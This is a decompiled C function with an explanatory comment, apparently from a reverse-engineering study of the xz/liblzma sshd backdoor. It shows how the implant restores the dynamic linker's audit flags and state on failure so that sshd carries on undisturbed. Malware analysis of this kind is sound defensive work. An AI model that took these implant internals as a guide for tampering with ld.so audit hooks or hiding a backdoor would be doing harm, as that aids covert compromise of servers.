// /home/kali/xzre-ghidra/xzregh/102770_init_ldso_ctx.c
// Function: init_ldso_ctx @ 0x102770
// Calling convention: unknown
// Prototype: undefined init_ldso_ctx(void)


/*
 * AutoDoc: Restores every ld.so flag the implant may have touched: it writes the saved auditstate
 * bindflags back to libcrypto/sshd, unsets the copied `l_name` byte, clears the
 * `l_audit_any_plt` bit with the mask recovered earlier, and zeros `_dl_naudit`/`_dl_audit` so
 * the dynamic linker no longer believes an audit module is registered. Stage two calls it on
 * failure paths so sshd resumes with the original ld.so state.
 */
#include "xzre_types.h"


void init_ldso_ctx(long param_1)

{
  undefined4 *puVar1;
  byte *pbVar2;
  byte *audit_flag_byte;
  
  if (param_1 != 0) {
    puVar1 = *(undefined4 **)(param_1 + 0x40);
    if (puVar1 != (undefined4 *)0x0) {
      *puVar1 = *(undefined4 *)(param_1 + 0x48);
      if (*(undefined8 **)(param_1 + 0xf8) != (undefined8 *)0x0) {
        **(undefined8 **)(param_1 + 0xf8) = puVar1;
      }
    }
    if (*(undefined4 **)(param_1 + 0x50) != (undefined4 *)0x0) {
      **(undefined4 **)(param_1 + 0x50) = *(undefined4 *)(param_1 + 0x58);
    }
    pbVar2 = *(byte **)(param_1 + 0x60);
    if (pbVar2 != (byte *)0x0) {
      *pbVar2 = *pbVar2 & ~*(byte *)(param_1 + 0x68);
    }
    if (*(undefined4 **)(param_1 + 0x78) != (undefined4 *)0x0) {
      **(undefined4 **)(param_1 + 0x78) = 0;
    }
    if (*(undefined8 **)(param_1 + 0x70) != (undefined8 *)0x0) {
      **(undefined8 **)(param_1 + 0x70) = 0;
    }
  }
  return;
}

